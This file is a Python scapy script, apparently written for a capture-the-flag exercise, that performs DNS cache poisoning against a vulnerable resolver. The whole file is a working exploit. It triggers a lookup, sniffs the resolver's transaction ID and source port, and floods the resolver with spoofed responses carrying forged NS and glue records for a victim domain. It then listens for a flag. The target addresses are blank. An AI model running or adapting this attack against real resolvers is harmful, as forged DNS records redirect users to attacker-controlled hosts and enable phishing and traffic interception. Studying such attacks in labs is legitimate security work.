#!/usr/bin/env python
__author__	= "Sleiman A."
__email__	= ""


from scapy.all import *
import threading
import sys
import socket
from dnslib import *
import time


DNS_SERVER_IP	    = ''					# IP address of the vulnerable DNS server
ATTACKER_IP		    = ''					# IP address of the DNS Server of the attacker
VICTIM_AUTH_DNS     = ''					# IP address of the DNS Server of the victim
FAKE_IP             = ''					# The spoofed IP address we want to set in the remote DNS server
ATTACKER_PORT       = 2018                  # The port we use to send a random query to the vulnerable DNS server
FLAG_PORT           = 1337                  # Number of port to listen to in order to get the flag
BAD_AUTH_DNS        = ''					# Name server of the attacker
VICTIM_DOMAIN       = ''					# The victim domain name
QUERY_TXID          = 12345                 # Transaction ID to send a random query to the vulnerable DNS server
RANDOM_SUBDOMAIN    = "r4nd0m"				# A random sub-domain of the victim domain
NUM_PACKETS			= 300					# Number of packets to flood the victim domain name server
TIMEOUT_INTERVAL	= 30					# Time in seconds to wait for the threads to finish before termination

buffer=[]

def lookup(target_domain, dns_server):
    print("[*] DNS lookup query for "+target_domain)
    time.sleep(2)
    request = "dig "+target_domain+ " @" +dns_server
    os.system(request)

def sniffPackets():
    print('[*] Sniffing DNS Packets ')
    pkts = sniff(iface='eth0', filter=" src REPLACE_WITH_IP and dst port 53", count=1, promisc =1)
    clientSrcPort = pkts[0].getlayer(UDP).sport
    clientDNSQueryID = pkts[0].getlayer(DNS).id
    print("Source Port: " + str(clientSrcPort))
    print("Query ID: " + str(clientDNSQueryID))
    return clientDNSQueryID, clientSrcPort

def sendRandomDNSQuery(sip, dip, sport, txid, target_domain):
    print("[*] sending crafted random query to  " + target_domain)
    query = (IP(src=sip, dst=dip) /
             UDP(sport=sport, dport=53) /
             DNS(id=txid, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
                 qd=DNSQR(qname=RANDOM_SUBDOMAIN+"."+target_domain, qtype='A', qclass='IN'),
                 an=0,
                 ns=0,
                 ar=0
                 ))
    send(query)


def prepareCraftedPackets(sip, dip, dport, txid, target_domain, fake_ip):
    print("[*] preparing packets")
    layer3 = IP(src=sip, dst=dip)
    layer4 = UDP(sport=53, dport=dport)
    for i in range(NUM_PACKETS):
        pkt = layer3 / layer4 / DNS(id=txid, qr=1, ra=1,
            qd=(DNSQR(qname=RANDOM_SUBDOMAIN + "." + target_domain, qtype='A', qclass='IN')),
            ns=(DNSRR(rrname=target_domain, type='NS', rclass='IN', ttl=3600, rdata='ns.' + target_domain )),
            ar=(DNSRR(rrname='ns.' + target_domain, type='A', rclass='IN', ttl=3600, rdata=fake_ip))
            )
        txid += 1
        buffer.append(pkt)
    print("[*] preparing finished")

def exploit():
	print("[*] Flooding the target DNS server")
	send(buffer, verbose=1)
	print("[*] Flooding finished")

def listen(ip, port):
    print ("[*] listen to response from server")
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_sock.bind((ip, port))
    secret, addr = listen_sock.recvfrom(1024)
    print ("Flag: " + secret)

#1- Make a dns query to an authoritative dns zone
try:
    dig = threading.Thread(target=lookup, args=(BAD_AUTH_DNS, DNS_SERVER_IP))
    dig.setDaemon(True)
    dig.start()
except:
    print ("Error digging")
#2- Sniff the query to get txid and source port of the target dns server
sniffed_txid, sniffed_sport  = sniffPackets()
prepareCraftedPackets(VICTIM_AUTH_DNS, DNS_SERVER_IP, sniffed_sport, sniffed_txid, VICTIM_DOMAIN, FAKE_IP)

try:
    # 3- Send a query of a subdomain not in the vulnerable DNS's cache
    randomQuery = threading.Thread(target=sendRandomDNSQuery, args = (ATTACKER_IP, DNS_SERVER_IP, ATTACKER_PORT, QUERY_TXID, VICTIM_DOMAIN))
    # 4- Flood the vulnerable DNS server with crafted DNS respones
    flood = threading.Thread(target=exploit)
    randomQuery.setDaemon(True)
    flood.setDaemon(True)
    randomQuery.start()
    flood.start()

except:
    print ("Error in queries")


#5- Listen to the port x to catch the secret
try:
    listenThread = threading.Thread(target=listen, args=(ATTACKER_IP, FLAG_PORT))
    listenThread.setDaemon(True)
    listenThread.start()
except:
    print ("Error CTF socket")
time.sleep (TIMEOUT_INTERVAL)		# Give x seconds to the threads to finish, then close.